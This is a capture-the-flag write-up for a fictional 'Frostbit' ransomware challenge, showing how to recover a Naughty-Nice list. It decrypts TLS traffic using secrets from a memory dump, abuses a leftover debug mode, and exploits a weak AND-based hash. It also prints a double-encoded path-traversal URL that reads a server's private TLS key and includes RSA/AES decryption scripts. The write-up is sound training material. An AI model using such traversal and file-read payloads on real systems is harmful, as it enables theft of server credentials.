# Decrypt the Naughty-Nice List

Difficulty: :material-star::material-star::material-star::material-star::material-star:

## Objective

!!! question "Task description"

    Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.

??? quote "Tangle Coalbox"

    Ah, there ya are, Gumshoe! Tangle Coalbox at yer service.

    Heard the news, eh? The elves’ civil war took a turn for the worse, and now, things’ve really gone sideways. Someone’s gone and ransomware’d the Naughty-Nice List!

    And just when you think it can't get worse—turns out, it was none other than ol’ Wombley Cube. He used Frostbit ransomware, all right. But, in true Wombley fashion, he managed to lose the encryption keys!

    That’s right, the list is locked up tight, and it’s nearly the start of the holiday season. Not ideal, huh? We're up a frozen creek without a paddle, and Santa’s big day is comin’ fast.

    The whole North Pole’s stuck in a frosty mess, unless—there’s someone out there with the know-how to break us out of this pickle.

    If I know Wombley—and I reckon I do—he didn't quite grasp the intricacies of Frostbit’s encryption. That gives us a sliver o' hope.

    If you can crack into that code, reverse-engineer it, we just might have a shot at pullin’ these holidays outta the ice.

    It’s no small feat, mind ya, but somethin’ tells me you've got the brains to make it happen, Gumshoe.

    So, no pressure, but if we don’t get this solved, the holidays could be in a real bind. I'm countin’ on ya!

    And when ya do crack it, I reckon Santa’ll make sure you're on the extra nice list this year. What d’ya say?

## Hints

??? tip "Frostbit Hashing"

    The Frostbit infrastructure might be using a reverse proxy, which may {==resolve certain URL encoding patterns before forwarding requests to the backend application==}. A reverse proxy may {==reject requests it considers invalid==}. You may need to employ creative methods to ensure the request is properly forwarded to the backend. There could be a way to exploit the cryptographic library by crafting a specific request {==using relative paths, encoding to pass bytes and using known values retrieved from other forensic artifacts==}. If successful, this could be the key to tricking the Frostbit infrastructure into {==revealing a secret necessary to decrypt files==} encrypted by Frostbit.

??? tip "Frostbit Dev Mode"

    There's a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn't {==disable dev mode==}, we might be able to pass extra options to reveal more information. If they are reusing our code or hardware, it might also be {==broadcasting MQTT messages==}.

??? tip "Frostbit Crypto"

    The Frostbit ransomware appears to use multiple encryption methods. Even after {==removing TLS==}, some values passed by the ransomware seem to be {==asymmetrically encrypted, possibly with PKI==}. The infrastructure may also be using {==custom cryptography==} to retrieve ransomware status. If the creator reused our cryptography, the infrastructure might depend on an outdated version of one of our libraries with {==known vulnerabilities==}. There may be a way to have the infrastructure {==reveal the cryptographic library==} in use.

??? tip "Frostbit Forensics"

    I'm with the North Pole cyber security team. We built a powerful EDR that captures process memory, network traffic, and malware samples. It's great for incident response - using tools like {==strings to find secrets in memory, decrypt network traffic, and run strace==} to see what malware does or executes.

## Solution

!!! warning "Warning"

    This challenge only has a gold achievement.

The terminal gives us an archive with artifacts to work on:

- `DoNotAlterOrDeleteMe.frostbit.json`: ransomware output parameters.
- `frostbit.elf`: ransomware sample.
- `frostbit_core_dump.13`: memory sample of ransomware.
- `naughty_nice_list.csv.frostbit`: encrypted file with answer.
- `ransomware_traffic.pcap`: captured network traffic related to the ransomware sample.

This challenge can be tackled in multiple ways. This write-up will show one of the ways to get to the answer. Other write-ups will use different paths.

### TLS decryption

The hints tell us that we can remove the TLS encryption from the .pcap. We run `strings` on the core dump to collect some information present in memory. We see the following interesting artifacts:

```
CLIENT_HANDSHAKE_TRAFFIC_SECRET 9919885c587a58f12ffe768f5dfd6bd9c147c0322ee22895f0c7cbb97ededc38 574f309921e0bb43ace02712056fee4066d6c2b01a07ad08d0668de6d8867ffd
SERVER_HANDSHAKE_TRAFFIC_SECRET 9919885c587a58f12ffe768f5dfd6bd9c147c0322ee22895f0c7cbb97ededc38 6c678fe326e01c68fdeefab5c5674faa93d07d1651a826b73354c7df68f3e9f1
CLIENT_TRAFFIC_SECRET_0 9919885c587a58f12ffe768f5dfd6bd9c147c0322ee22895f0c7cbb97ededc38 fc6b72245861535008917548cde2a08e39d17cacd7371b7ed7a44ed86cc11330
SERVER_TRAFFIC_SECRET_0 9919885c587a58f12ffe768f5dfd6bd9c147c0322ee22895f0c7cbb97ededc38 054a1cda91cf3e370eef0f8a79f908d189fc07b636453307a6b37396ee421987

POST /api/v1/bot/cf9b1b33-b17b-433b-a473-2d8c5f06c1a5/key HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Content-Length: 1070
Content-Type: application/json
Accept-Encoding: gzip
{"encryptedkey":"5def927437b3dd61274753c3ac02ff27a048449880de0ea43363e9da22c771d19826ef6da645abbe4f1dff6abbaefb483cf0f4a58bb714483a02ee8795560a75b856f352112b6865a708cf082323998ed2bc9b55e654872a6f4c5fb4bc210ae3ccb4b4e92626cc8558be45d7bc1513fdd3632e65ad78dd04e8857fe799bfd2fe58207568e757b307f0715667276ab717a52b3a990029c4ce359e1ae805a0703005be7e4bcaf4b07ffb01271f960e56c0a6eb492aa340e02b0ef7860e85ed672ddccb36ee60b7d78a485e81e3ac6601587315d11647ca3d5a6fd5010b2476020d451edcb94d554a1c9a693f532dac1e304ad41ccdee151a70cdda2a6292021292395b1662371636e71a20931479ba511893b30a17de1a3bc3c63320b7ee44527ee980a525e7abe88f01a5eac6f2c4bdbdd74000b7dc872633662cc888efae1d0a050498b610f2ce85b17f474746f70861e6b9f204873323f4a0bc33f68552048a24ae2c3c118db2853a56ba1219da584b94fd68296dab87c3538adb1ec75396fdd466d1937dc5ef1f7cd838e880ec1d5733f6c6616eaba9f32493a670e56d2c9579a357b067a6de19e857b79dcdad2810e07d05aef065a0043fcd3e81701ffa9d1a8bb2ec7c5ae429e111f4950cc0ba1bad55cbc355a10e531f75584d13640c0f0b75cc0313b576b78f332d538d7efbf6daca0d0aad36d26f3726de3786a141fe","nonce":""}
```

Without any decryption, we already see some network traffic. Still, let's make sure we have the complete picture. We have some secrets we can use to [decrypt the TLS traffic](https://mpolinowski.github.io/docs/DevOps/Security/2022-09-27--wireshark-with-tls-encryption/2022-09-27/). We create an `ssl.log` file and paste in the first four lines of the strings. We then open Wireshark, go to Edit -> Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename -> select our `ssl.log` file -> Apply. We can now open the .pcap file and read the full TLS stream:

```tls title="Decrypted TLS stream"
GET /api/v1/bot/40cc386b-b607-4f0c-8cac-e45483b68a70/session HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Fri, 03 Jan 2025 19:01:53 GMT
Content-Type: application/json
Content-Length: 29
Connection: keep-alive
Strict-Transport-Security: max-age=31536000

{"nonce":"18965f8a3073c813"}

POST /api/v1/bot/40cc386b-b607-4f0c-8cac-e45483b68a70/key HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Content-Length: 1070
Content-Type: application/json
Accept-Encoding: gzip

{"encryptedkey":"3a7605fa7462e65a1e65819347cf729d845e46ace4c1883019049dba5deda3695e533b0890d89aad9b48e6f64cc4e74ed1053c70875b9950111ccd7813507488b3730c9030f40910525df4a33ece919e0cc3e44a8977bcbcbb19786c3fdf8cffdbbbab88338c8adb0487d6a21d1b2dda68f652e55ac799da8077204441d68dae414a6274c0d86e9213264a751361ac18f3b63eb9bf93a7e69d86a7cf19586861c470974a5f78dd295f8271d2ba17ad8b7ce8f36bf46b1296dc18dc422fd86c6aa21945ee820ec97e4059552a3542777570100b1e01cca31f1acd9e649e43f779630833f208c4bde0996df8fb5d94263e9a0716bca046b972b3abdb28e65c33a2a0cb99e99ab84f3df9e7ef2fc2fcd3e5f3387dfa7e25fcc7b35a7fd541597c8984aa8cde5315612b569ce6f5e21d2b7300fb4836f5bfcb402a9e162678c3af56780728db6555be8c2bad44614531ed22071aa0447144a407b717998aaf886100c925546370de54840d4d4db6e10d098ec20c8ae3bc218bcb80f868953073e58f1b5d29acf783b2b51a0d5380cc4d6e40bb5f0c6305be20429fe07b52b80f89cf079a3353f908e6dfcf84e666f0c7ed1424dab1ac55e52d0d7f18e2b59785a3f89b6c780dec39145603b681bae44ead0be3a048e7364b7d5448708cb00d022090143956accaa94bb6c5a8d08bbc3984a2d4205e116ef8418d3ab4ad29d059ae87","nonce":"18965f8a3073c813"}

HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Fri, 03 Jan 2025 19:01:53 GMT
Content-Type: application/json
Content-Length: 97
Connection: keep-alive
Strict-Transport-Security: max-age=31536000

{"digest":"008200a104079150409910a22b499400","status":"Key Set","statusid":"LdqdRKkhK8UX22x9ok"}

```

From this we understand the following:

- This info was already available to us in the strings and .json file.
- We have an key that is encrypted with PKI as shared in the hints.
- We have a nonce, digest (hash), and status ID.

### Network infrastructure

In the strings we also find some URLs to the Frostbit app we have seen before in [Santa Vision](santa_vision.md). The hints also indicate that we must think about the MQTT feeds from that challenge, which contained a deactivation URL (see [Deactivate](deactivate.md) for more information) and a reference to a certificate key. This key is likely the PKI infrastructure the hints refer to and needed for decryption. We list our known URLs from these sources and their likely purpose.

```
# Ransomware status page (GET)
https://api.frostbit.app/view/LdqdRKkhK8UX22x9ok/40cc386b-b607-4f0c-8cac-e45483b68a70/status?digest=008200a104079150409910a22b499400
# Get nonce (GET)
https://api.frostbit.app/api/v1/bot/40cc386b-b607-4f0c-8cac-e45483b68a70/session
# Set key (POST)
https://api.frostbit.app/api/v1/bot/40cc386b-b607-4f0c-8cac-e45483b68a70/key
# Deactivate (POST)
https://api.frostbit.app/api/v1/frostbitadmin/bot/40cc386b-b607-4f0c-8cac-e45483b68a70/deactivate
# MQTT message pointing at a key, likely the PKI key needed for decryption.
Let's Encrypt cert for api.frostbit.app verified. at path /etc/nginx/certs/api.frostbit.app.key
```

The ransomware status page gives us a timer and is meant to show the decryption key when payment has been made.

![Code request](../images/decrypt/decrypt_1.png)
/// caption
Frostbit 2.0 ransomware status page.
///

### Exploiting debug mode

The hints indicate that there is a dev mode that is still turned on. In the status page source code we see some references to debug mode:

```html title="Some debug mode references"
<!-- Placeholder for Debug Data -->
<div id="debug" style="margin-top: 20px;"></div>
```

We add a parameter to the URL:

`https://api.frostbit.app/view/j7hYYCSYXMPC3hrVDg/40cc386b-b607-4f0c-8cac-e45483b68a70/status?digest=80906082868080ac828124b88c20044d&debug=1`

On the bottom of the page we now see the following which unfortunately doesn't help us much, but it confirms that the debug mode is working:

`{"uuid": "40cc386b-b607-4f0c-8cac-e45483b68a70", "nonce": "REDACTED", "encryptedkey": "REDACTED", "deactivated": false,  "etime": 1766534400}`

We fiddle some more with the URL to see if we can trigger any errors. When we remove a character from the digest, we get the following error:

```js
{
  "debug": true,
  "error": "Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n"
}
```

This reveals the location of the crypto library mentioned in the hints. We can view it at `https://api.frostbit.app/static/FrostBiteHashlib.py`.

??? note "Crypto library"

    ``` python title="FrostBiteHashlib.py" linenums="1" hl_lines="27 28"
    import traceback
    import binascii

    class Frostbyte128:
        def __init__(self, file_bytes: bytes, filename_bytes: bytes, nonce_bytes: bytes, hash_length: int = 16):
            self.file_bytes = file_bytes
            self.filename_bytes = filename_bytes
            self.filename_bytes_length = len(self.filename_bytes)
            self.nonce_bytes = nonce_bytes
            self.nonce_bytes_length = len(self.nonce_bytes)
            self.hash_length = hash_length
            self.hash_result = self._compute_hash()

        def _compute_hash(self) -> bytes:
            hash_result = bytearray(self.hash_length)
            count = 0

            for i in range(len(self.file_bytes)):
                xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length]
                hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd
                count += 1

            for i in range(len(self.filename_bytes)):
                count_mod = count % self.hash_length
                count_filename_mod = count % self.filename_bytes_length
                count_nonce_mod = count % self.nonce_bytes_length
                xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]
                hash_result[count_mod] = hash_result[count_mod] & xrd
                count += 1

            return bytes(hash_result)

        def digest(self) -> bytes:
            """Returns the raw binary hash result."""
            return self.hash_result

        def hexdigest(self) -> str:
            """Returns the hash result as a hexadecimal string."""
            return binascii.hexlify(self.hash_result).decode()

        def update(self, file_bytes: bytes = None, filename_bytes: bytes = None, nonce_bytes: bytes = None):
            """Updates the internal state with new bytes and recomputes the hash."""
            if file_bytes is not None:
                self.file_bytes = file_bytes
            if filename_bytes is not None:
                self.filename_bytes = filename_bytes
            if nonce_bytes is not None:
                self.nonce_bytes = nonce_bytes

            self.hash_result = self._compute_hash()

        def validate(self, hex_string: str):
            """Validates if the provided hex string matches the computed hash."""
            try:
                decoded_bytes = binascii.unhexlify(hex_string)
                if decoded_bytes == self.digest():
                    return True, None
            except Exception as e:
                stack_trace = traceback.format_exc()
                return False, f"{stack_trace}"
            return False, None
    ```

??? example "AI usage"

    ChatGPT was used to analyze the code and look for possible vulnerabilities as suggested by the hints.

We learn that the digest is computed based on the file, filename, and nonce bytes. We know the nonce. We do not have control over the file bytes, but can modify the filename in the URL.

This is sufficient for us because the hashing function is vulnerable. The highlighted line 28 in the code conducts an AND operation which are not as safe regarding entropy as XOR operations. This gives us the possibility to control what the digest will be, which we can exploit.

### Exploitation

The hints indicate that we must trick the reverse proxy somehow. This sounds like path traversal and encoding trickery. We start playing around with `statusid` in the URL and find the following error with a specific URL where we apply local file injection for our key file:

```
https://api.frostbit.app/view/..%252f..%252f..%252f..%252fetc%252fnginx%252fcerts%252fapi.frostbit.app.key/40cc386b-b607-4f0c-8cac-e45483b68a70/status?digest=80906082868080ac828124b88c20044d&debug=true

{
  "debug": true,
  "error": "Invalid Status Id or Digest"
}
```

This means we are now supplying the key file to the crypto library. If we get the digest aligned, the ransomware status page will display the key.

Looking at the truth tables for AND and XOR, we can see that the AND operator gives us the opportunity to always compute a bit as a zero, no matter the input.

??? note "AND Truth Table"

    | A   | B   | Y   |
    | --- | --- | --- |
    | 0   | 0   | 0   |
    | 0   | 1   | 0   |
    | 1   | 0   | 0   |
    | 1   | 1   | 1   |

??? note "XOR Truth Table"

    | A   | B   | Y   |
    | --- | --- | --- |
    | 0   | 0   | 0   |
    | 0   | 1   | 1   |
    | 1   | 0   | 1   |
    | 1   | 1   | 0   |

These two lines in the crypto library are critical:

```python
xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]
hash_result[count_mod] = hash_result[count_mod] & xrd
```

Since we know the nonce, we can include it in the filename we supply and use it to let our `xrd` parameter become all zeroes because of the XOR operator. It will then be used to compute the final digest value, and we'll then know it will be all zeroes as well because of the nature of the AND operator.

??? example "AI usage"

    ChatGPT was used to generate a Python script using the crypto library to experiment with how the digest changes based on the filename input, the nonce, and randomly generated bytes.

Our nonce is `18965f8a3073c813` and represented in hexadecimal. Using [CyberChef](<https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MTg5NjVmOGEzMDczYzgxMw&oenc=65001>) we can convert it to an UTF-8 value: `_0sÈ` (might not be showed correctly on this webpage). With our helper script we can figure out how to make our digest all zeroes. We find the following URL where we move to the root using path traversal, move into a non-existent folder based on our nonce values, move back to root, and move to our keyfile, with a digest consisting only of zeroes:

`https://api.frostbit.app/view/..%252f..%252f..%252f..%252f%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%18%C2%96_%C2%8A0s%C3%88%13%252f..%252fetc%252fnginx%252fcerts%252fapi.frostbit.app.key/40cc386b-b607-4f0c-8cac-e45483b68a70/status?digest=00000000000000000000000000000000&debug=true`

### Decrypting the naughty-nice list

The URL gives us the ransomware status page with the key file.

??? note "Key file"

    ``` ssh title="Frostbit key"
        -----BEGIN RSA PRIVATE KEY-----
    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
    -----END RSA PRIVATE KEY-----
    ```

We save this key to `rsa.pem`. In the strings of the memory dump we find the following reference to the used cipher:

```
*x509.pkcs1PublicKey
```

We generate a script to decrypt our key found in the network traffic.

??? example "AI usage"

    ChatGPT was used to generate a decryption script as we didn't get it to work using CyberChef.

??? note "RSA decryption script"

    ``` python title="Decryption script"
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    from Crypto.Util.Padding import unpad
    import binascii

    with open('rsa.pem', 'rb') as f:
        rsa_key = RSA.import_key(f.read())

    encrypted_aes_key_hex = "3a7605fa7462e65a1e65819347cf729d845e46ace4c1883019049dba5deda3695e533b0890d89aad9b48e6f64cc4e74ed1053c70875b9950111ccd7813507488b3730c9030f40910525df4a33ece919e0cc3e44a8977bcbcbb19786c3fdf8cffdbbbab88338c8adb0487d6a21d1b2dda68f652e55ac799da8077204441d68dae414a6274c0d86e9213264a751361ac18f3b63eb9bf93a7e69d86a7cf19586861c470974a5f78dd295f8271d2ba17ad8b7ce8f36bf46b1296dc18dc422fd86c6aa21945ee820ec97e4059552a3542777570100b1e01cca31f1acd9e649e43f779630833f208c4bde0996df8fb5d94263e9a0716bca046b972b3abdb28e65c33a2a0cb99e99ab84f3df9e7ef2fc2fcd3e5f3387dfa7e25fcc7b35a7fd541597c8984aa8cde5315612b569ce6f5e21d2b7300fb4836f5bfcb402a9e162678c3af56780728db6555be8c2bad44614531ed22071aa0447144a407b717998aaf886100c925546370de54840d4d4db6e10d098ec20c8ae3bc218bcb80f868953073e58f1b5d29acf783b2b51a0d5380cc4d6e40bb5f0c6305be20429fe07b52b80f89cf079a3353f908e6dfcf84e666f0c7ed1424dab1ac55e52d0d7f18e2b59785a3f89b6c780dec39145603b681bae44ead0be3a048e7364b7d5448708cb00d022090143956accaa94bb6c5a8d08bbc3984a2d4205e116ef8418d3ab4ad29d059ae87"

    encrypted_aes_key = binascii.unhexlify(encrypted_aes_key_hex)

    cipher = PKCS1_v1_5.new(rsa_key)
    decrypted_aes_key = cipher.decrypt(encrypted_aes_key, None)

    print(f"Decrypted AES key: {binascii.hexlify(decrypted_aes_key).decode()}")
    ```

The script gives us this:

`Decrypted AES key: 36323364393033653337613364626164353430346366626337373637663562352c31383936356638613330373363383133`

We have to convert it from hex using [CyberChef](<https://gchq.github.io/CyberChef/#recipe=From_Hex('None')>):

`623d903e37a3dbad5404cfbc7767f5b5,18965f8a3073c813`

We can now finally decrypt the encrypted .csv file.

??? example "AI usage"

    ChatGPT was used to generate a decryption script as we didn't get it to work using CyberChef.

??? note "AES decryption script"

    ``` py title="Decryption script"
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad

    def decrypt_file(encrypted_file, decrypted_file, key, iv):
        with open(encrypted_file, 'rb') as f:
            encrypted_data = f.read()

        # Initialize AES in CBC mode
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

        with open(decrypted_file, 'wb') as f:
            f.write(decrypted_data)
        print("File decrypted successfully.")

    # Inputs
    key = b'623d903e37a3dbad5404cfbc7767f5b5'  # Replace with your 16/24/32-byte key
    iv = b'18965f8a3073c813'        # Replace with your 16-byte IV
    encrypted_file = 'naughty_nice_list.csv.frostbit'
    decrypted_file = 'decrypted_file.csv'

    decrypt_file(encrypted_file, decrypted_file, key, iv)
    ```

!!! success "Answer"

    We can read the naughty-nice list and find this child at number 440: ```Xena Xtreme```.

## Response

??? quote "Tangle Coalbox"

    Well, I’ll be a reindeer’s uncle! You've done it, Gumshoe! You cracked that frosty code and saved the Naughty-Nice List just in the nick of time. The elves’ll be singin’ your praises from here to the South Pole!

    I knew you had it in ya. Now, let’s get these toys delivered and make this a holiday to remember. You're a true North Pole hero!
